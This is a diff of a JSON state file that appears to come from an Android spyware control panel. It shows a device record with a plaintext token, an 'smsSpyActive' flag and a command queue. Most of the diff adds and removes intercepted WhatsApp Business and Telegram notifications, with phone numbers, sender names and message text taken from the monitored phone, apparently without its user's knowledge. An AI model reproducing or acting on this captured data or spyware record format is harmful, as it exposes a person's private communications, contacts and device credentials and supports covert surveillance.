@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633215559,
+    "lastSeen": 1775633218557,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "📡 Undangan admin saluran",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633219042
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎124 pesan dari 4 chat",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633216791
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "Permisi Azx",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633216779
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎123 pesan dari 4 chat",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633216194
+      },
       {
         "appName": "WA Business",
         "sender": "+62 856-2460-4911",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:10",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632245527
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "10 new messages from 10 chats",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632245318
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632240934
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632236729
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Alifzx rezz",
-        "content": "Photo",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632236654
       }
     ],
     "galleryPhotos": [],
